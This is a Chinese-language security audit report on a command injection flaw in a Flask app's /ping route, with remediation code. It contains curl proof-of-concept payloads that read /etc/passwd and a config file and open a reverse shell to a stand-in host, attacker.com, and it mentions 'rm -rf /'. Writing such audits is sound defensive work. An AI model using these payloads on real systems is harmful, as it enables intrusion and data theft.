# 用户管理系统 — 命令注入漏洞审计报告

**审计日期：** 2026-07-15  
**目标系统：** http://192.168.119.128:5000  
**审计范围：** `/ping` 路由 — `app.py` 第 550-574 行  
**测试账号：** admin / admin123

---

## 漏洞汇总

| 编号 | 漏洞类型 | 风险等级 | CWE | 位置 |
|------|---------|---------|-----|------|
| CMDI-1 | OS 命令注入（无过滤） | 🔴 严重 | CWE-78 | app.py:564 |
| CMDI-2 | shell=True 执行系统命令 | 🔴 严重 | CWE-78 | app.py:565 |
| CMDI-3 | 命令执行结果回显 | 🟠 高危 | CWE-78 | app.py:574 |
| CMDI-4 | f-string 拼接用户输入 | 🔴 严重 | CWE-78 | app.py:564 |

---

## 🔴 CMDI-1：OS 命令注入

### 漏洞位置

`app.py` 第 564 行

### 问题代码

```python
ip = request.form.get("ip", "").strip()
cmd = f"ping -c 3 {ip}"                          # ← f-string 直接拼接用户输入
output = subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT)  # ← shell=True
```

### 风险分析

代码使用 `f-string` 将用户输入的 `ip` 参数直接拼接到系统命令中，并通过 `shell=True` 交由系统 shell 执行。攻击者可利用 shell 元字符（`;`、`|`、`&&`、`` ` ``、`$()` 等）注入任意命令。

### 利用验证

| 输入 | 实际执行的命令 | 结果 |
|------|---------------|------|
| `127.0.0.1` | `ping -c 3 127.0.0.1` | ✅ 正常 ping |
| `127.0.0.1;id` | `ping -c 3 127.0.0.1;id` | ✅ **执行 id 命令** |
| `127.0.0.1\|whoami` | `ping -c 3 127.0.0.1\|whoami` | ✅ **执行 whoami** |
| `127.0.0.1 && ls /tmp` | `ping -c 3 127.0.0.1 && ls /tmp` | ✅ **列出 /tmp** |
| `` 127.0.0.1`cat /etc/hostname` `` | `ping -c 3 127.0.0.1`cat /etc/hostname`` | ✅ **命令替换执行** |
| `$(cat /etc/hostname)` | `ping -c 3 $(cat /etc/hostname)` | ✅ **子 shell 执行** |

### 利用示例（PoC）

```bash
# 查看当前用户（root）
curl -X POST "http://192.168.119.128:5000/ping" \
  -d "ip=127.0.0.1;id"

# 读取系统密码文件
curl -X POST "http://192.168.119.128:5000/ping" \
  -d "ip=127.0.0.1;cat /etc/passwd"

# 查看系统配置
curl -X POST "http://192.168.119.128:5000/ping" \
  -d "ip=127.0.0.1 && cat /etc/frpc.toml"

# 反弹 shell
curl -X POST "http://192.168.119.128:5000/ping" \
  -d "ip=127.0.0.1;bash -i >& /dev/tcp/attacker.com/4444 0>&1"
```

### 漏洞危害

- **服务器完全沦陷**：攻击者可以 root 权限执行任意系统命令
- **敏感数据泄露**：读取 `/etc/shadow`、数据库文件、应用源码、配置文件
- **持久化后门**：写入 SSH 密钥、创建新用户、安装木马
- **横向移动**：扫描内网、攻击其他服务
- **数据篡改/删除**：`rm -rf /` 等破坏性操作

---

## 🔴 CMDI-2：shell=True 的危险使用

### 漏洞位置

`app.py` 第 565 行

### 问题代码

```python
subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT)
```

### 风险分析

`shell=True` 将命令字符串直接传递给系统的 shell 解释器（`/bin/sh -c`），shell 会解析其中的所有特殊字符（`;`、`|`、`&`、`$()` 等）。这使得任何输入过滤的绕过都极为容易。

### 安全对比

```python
# 危险：shell=True + 字符串拼接
subprocess.check_output(f"ping -c 3 {ip}", shell=True)

# 安全：使用参数列表，避免 shell 解析
subprocess.check_output(["ping", "-c", "3", ip])
```

---

## 🟠 CMDI-3：命令执行结果回显

### 漏洞位置

`app.py` 第 574 行

### 问题代码

```python
return render_template("ping.html", output=output)
```

### 风险分析

命令的输出（包括注入命令的结果）直接返回给用户。攻击者无需盲注，可以直接看到命令执行的全部输出内容，大大降低了利用难度。

### 与盲注的对比

```
有回显（本系统）： 输入 ;id → 输出 "uid=0(root)"  ← 即时获取结果
无回显（盲注）：   输入 ;id → 无输出，需要延时或带外通道
```

---

## 🔴 CMDI-4：f-string 直接拼接用户输入

### 漏洞位置

`app.py` 第 564 行

### 问题代码

```python
cmd = f"ping -c 3 {ip}"
```

### 风险分析

使用 f-string 将用户输入直接嵌入命令字符串，没有任何转义或校验。攻击者可通过以下方式注入：

| 注入方式 | 示例 | 效果 |
|---------|------|------|
| 分号 | `127.0.0.1;id` | 执行多个命令 |
| 管道符 | `127.0.0.1\|cat /etc/passwd` | 管道传递输出 |
| 逻辑与 | `127.0.0.1 && ls` | 条件执行 |
| 逻辑或 | `127.0.0.1 \|\| id` | 条件执行 |
| 反引号 | `` 127.0.0.1`whoami` `` | 命令替换 |
| 子 shell | `$(whoami)` | 子 shell 执行 |
| 换行 | `127.0.0.1%0aid` | URL 编码换行 |

---

## 攻击链综合分析

```
攻击者（已登录）
       │ POST /ping  body: ip=127.0.0.1;cat /etc/passwd
       ▼
┌─────────────────────────────────────┐
│ cmd = f"ping -c 3 {ip}"             │
│     = "ping -c 3 127.0.0.1;cat ..." │
└──────────────┬──────────────────────┘
               │ shell=True
               ▼
┌─────────────────────────────────────┐
│ /bin/sh -c "ping -c 3 127.0.0.1    │
│           ;cat /etc/passwd"         │
└──────────────┬──────────────────────┘
               │
     ┌─────────┼───────────┐
     ▼         ▼           ▼
 读取文件   反弹shell    写后门
  泄露      远程控制    持久化
```

---

## 修复建议

### 方案一：使用参数列表（推荐，最安全）

```python
# 替换：
cmd = f"ping -c 3 {ip}"
output = subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT)

# 改为：
output = subprocess.check_output(["ping", "-c", "3", ip], timeout=30, stderr=subprocess.STDOUT)
```

使用参数列表方式，`ip` 参数不会经过 shell 解析，彻底杜绝命令注入。

### 方案二：输入验证（防御性编程）

```python
import re

# 只允许 IP 地址或域名格式
if not re.match(r'^[a-zA-Z0-9.-]+$', ip):
    return render_template("ping.html", output="无效的 IP 地址格式")
```

### 方案三：禁用 shell=True（必要措施）

```python
# 永远不要使用 shell=True 执行拼接命令
output = subprocess.check_output(["ping", "-c", "3", ip], timeout=30)
```

### 方案四：使用 shlex.quote()（临时方案）

```python
import shlex
cmd = f"ping -c 3 {shlex.quote(ip)}"
```

---

## 修复对照表

| 漏洞 | 位置 | 严重程度 | 最低修复方案 |
|------|------|---------|------------|
| CMDI-1 | `ping` 路由 | 🔴 立即 | 改用参数列表替代字符串拼接 |
| CMDI-2 | `shell=True` | 🔴 立即 | 移除 `shell=True` |
| CMDI-3 | 结果回显 | 🟠 尽快 | 限制回显内容或长度 |
| CMDI-4 | f-string 拼接 | 🔴 立即 | 参数化命令或输入校验 |

### 一键修复代码

```python
# 将第 563-566 行替换为：
try:
    output = subprocess.check_output(
        ["ping", "-c", "3", ip],
        timeout=30,
        stderr=subprocess.STDOUT
    )
    output = output.decode("utf-8", errors="replace")
except subprocess.CalledProcessError as e:
    output = e.output.decode("utf-8", errors="replace") if e.output else f"命令执行失败，返回码: {e.returncode}"
except subprocess.TimeoutExpired as e:
    output = f"命令执行超时: {e}"
except Exception as e:
    output = f"执行出错: {str(e)}"
```

---

*报告生成工具：Claude Code Security Audit*
